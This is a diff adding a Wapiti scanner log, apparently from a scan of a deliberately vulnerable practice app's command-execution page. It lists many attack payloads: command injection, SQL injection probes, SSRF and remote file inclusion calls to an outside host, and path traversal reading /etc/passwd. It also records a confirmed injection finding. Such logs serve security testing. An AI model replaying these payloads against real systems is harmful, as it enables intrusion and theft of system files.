@@ -1,0 +1,618 @@
+2024-03-20 12:43:35.362 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit
+2024-03-20 12:43:35.481 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit
+2024-03-20 12:43:35.482 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:35.600 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 12:43:35.600 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_dda8abfd.db
+2024-03-20 12:43:35.604 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
+2024-03-20 12:43:35.634 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 12:43:35.634 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 12:43:35.740 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 12:43:35.740 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 12:43:35.741 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 12:43:35.752 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:35.760 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit
+2024-03-20 12:43:35.762 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=%3Benv%3B&Submit=Submit
+2024-03-20 12:43:35.848 | RED      | wapitiCore.attack.mod_exec:attack:202 - ---
+2024-03-20 12:43:35.848 | RED      | wapitiCore.attack.mod_exec:attack:203 - Command execution in http://web/vulnerabilities/exec/ via injection in the parameter ip
+2024-03-20 12:43:35.848 | RED      | wapitiCore.attack.mod_exec:attack:209 - Evil request:
+2024-03-20 12:43:35.849 | RED      | wapitiCore.attack.mod_exec:attack:210 -     POST /vulnerabilities/exec/ HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security=low
+    content-type: application/x-www-form-urlencoded
+    content-length: 26
+    Content-Type: application/x-www-form-urlencoded
+
+    ip=%3Benv%3B&Submit=Submit
+2024-03-20 12:43:35.849 | RED      | wapitiCore.attack.mod_exec:attack:211 - ---
+2024-03-20 12:43:35.851 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%3Benv%3B
+2024-03-20 12:43:35.874 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%7Cenv%7C
+2024-03-20 12:43:35.901 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=a%3Benv%3B
+2024-03-20 12:43:35.925 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=a%3Benv%3B
+2024-03-20 12:43:35.949 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 12:43:35.973 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%3Benv%3B
+2024-03-20 12:43:35.994 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%0Aenv%3B
+2024-03-20 12:43:36.026 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%26set%26
+2024-03-20 12:43:36.055 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=set
+2024-03-20 12:43:36.073 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=env
+2024-03-20 12:43:36.090 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%2Fe%00
+2024-03-20 12:43:36.109 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.132 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.152 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.170 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.191 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.212 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.231 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.252 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.271 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.292 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.313 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.337 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.354 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 12:43:36.373 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=a%60%29%60
+2024-03-20 12:43:36.397 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=a%60sleep%2060%60
+2024-03-20 12:43:36.416 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=a%3Bsleep%2060%3B
+2024-03-20 12:43:36.434 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=a%7Csleep%2060%3B
+2024-03-20 12:43:36.451 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 12:43:36.475 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit
+2024-03-20 12:43:36.476 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%3Benv%3B
+2024-03-20 12:43:36.501 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%7Cenv%7C
+2024-03-20 12:43:36.521 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=a%3Benv%3B
+2024-03-20 12:43:36.538 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=a%3Benv%3B
+2024-03-20 12:43:36.560 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 12:43:36.581 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%3Benv%3B
+2024-03-20 12:43:36.601 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%0Aenv%3B
+2024-03-20 12:43:36.622 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%26set%26
+2024-03-20 12:43:36.642 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=set
+2024-03-20 12:43:36.664 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=env
+2024-03-20 12:43:36.689 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%2Fe%00
+2024-03-20 12:43:36.716 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.738 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.762 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.798 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.821 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.848 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.873 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.909 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.935 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.957 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:36.977 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 12:43:36.994 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 12:43:37.014 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 12:43:37.037 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=a%60%29%60
+2024-03-20 12:43:37.058 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=a%60sleep%2060%60
+2024-03-20 12:43:37.075 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=a%3Bsleep%2060%3B
+2024-03-20 12:43:37.094 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=a%7Csleep%2060%3B
+2024-03-20 12:43:37.114 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 12:43:37.155 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 12:43:37.166 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:37.189 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit
+2024-03-20 12:43:37.190 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%C2%BF%27%22%28&Submit=Submit
+2024-03-20 12:43:37.205 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=fuzz%C2%BF%27%22%28
+2024-03-20 12:43:37.262 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%20AND%2074%3D117%20AND%2099%3D99&Submit=Submit
+2024-03-20 12:43:37.304 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%27%20AND%2099%3D193%20AND%20%2744%27%3D%2744&Submit=Submit
+2024-03-20 12:43:37.347 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%22%20AND%2020%3D62%20AND%20%2217%22%3D%2217&Submit=Submit
+2024-03-20 12:43:37.384 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%29%20AND%2051%3D66%20AND%20%2865%3D65&Submit=Submit
+2024-03-20 12:43:37.424 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%27%29%20AND%2021%3D50%20AND%20%28%2763%27%3D%2763&Submit=Submit
+2024-03-20 12:43:37.463 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%22%29%20AND%2022%3D97%20AND%20%28%2259%22%3D%2259&Submit=Submit
+2024-03-20 12:43:37.507 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%20AND%2018%3D81%20AND%2052%3D52
+2024-03-20 12:43:37.558 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%27%20AND%2038%3D76%20AND%20%2775%27%3D%2775
+2024-03-20 12:43:37.609 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%22%20AND%2059%3D87%20AND%20%2275%22%3D%2275
+2024-03-20 12:43:37.671 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%29%20AND%2013%3D100%20AND%20%2834%3D34
+2024-03-20 12:43:37.709 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%27%29%20AND%2033%3D66%20AND%20%28%2777%27%3D%2777
+2024-03-20 12:43:37.761 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%22%29%20AND%2083%3D102%20AND%20%28%2213%22%3D%2213
+2024-03-20 12:43:37.815 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit
+2024-03-20 12:43:37.815 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%C2%BF%27%22%28
+2024-03-20 12:43:37.873 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default%20AND%2047%3D127%20AND%2034%3D34&Submit=Submit
+2024-03-20 12:43:37.904 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default%27%20AND%2031%3D106%20AND%20%2780%27%3D%2780&Submit=Submit
+2024-03-20 12:43:37.937 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default%22%20AND%2037%3D57%20AND%20%2216%22%3D%2216&Submit=Submit
+2024-03-20 12:43:37.968 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default%29%20AND%2047%3D145%20AND%20%2852%3D52&Submit=Submit
+2024-03-20 12:43:37.999 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default%27%29%20AND%2058%3D149%20AND%20%28%2754%27%3D%2754&Submit=Submit
+2024-03-20 12:43:38.037 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default%22%29%20AND%2055%3D148%20AND%20%28%2285%22%3D%2285&Submit=Submit
+2024-03-20 12:43:38.075 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%20AND%2055%3D93%20AND%2012%3D12
+2024-03-20 12:43:38.113 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%27%20AND%2016%3D58%20AND%20%2757%27%3D%2757
+2024-03-20 12:43:38.153 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%22%20AND%2081%3D173%20AND%20%2243%22%3D%2243
+2024-03-20 12:43:38.181 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%29%20AND%2075%3D92%20AND%20%2813%3D13
+2024-03-20 12:43:38.214 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%27%29%20AND%2029%3D76%20AND%20%28%2797%27%3D%2797
+2024-03-20 12:43:38.258 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit%22%29%20AND%2086%3D146%20AND%20%28%2259%22%3D%2259
+2024-03-20 12:43:38.333 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 12:43:38.346 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:38.354 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit
+2024-03-20 12:43:38.354 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fc21bdf%2F1%2F6970%2F&Submit=Submit
+2024-03-20 12:43:38.378 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fc21bdf%2F1%2F5375626d6974%2F
+2024-03-20 12:43:38.416 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit
+2024-03-20 12:43:38.417 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fc21bdf%2F3%2F5375626d6974%2F
+2024-03-20 12:43:38.464 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=c21bdf for results, please wait...
+2024-03-20 12:43:40.547 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 12:43:40.601 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 12:43:40.614 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/exec/ (1)
+2024-03-20 12:43:40.623 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit
+2024-03-20 12:43:40.625 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&Submit=Submit
+2024-03-20 12:43:40.644 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&Submit=Submit
+2024-03-20 12:43:40.668 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:40.691 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=%2Fetc%2Fpasswd%00&Submit=Submit
+2024-03-20 12:43:40.713 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:40.736 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:40.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&Submit=Submit
+2024-03-20 12:43:40.781 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&Submit=Submit
+2024-03-20 12:43:40.801 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&Submit=Submit
+2024-03-20 12:43:40.820 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:40.839 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:40.862 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&Submit=Submit
+2024-03-20 12:43:40.884 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&Submit=Submit
+2024-03-20 12:43:40.908 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&Submit=Submit
+2024-03-20 12:43:40.926 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:40.948 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
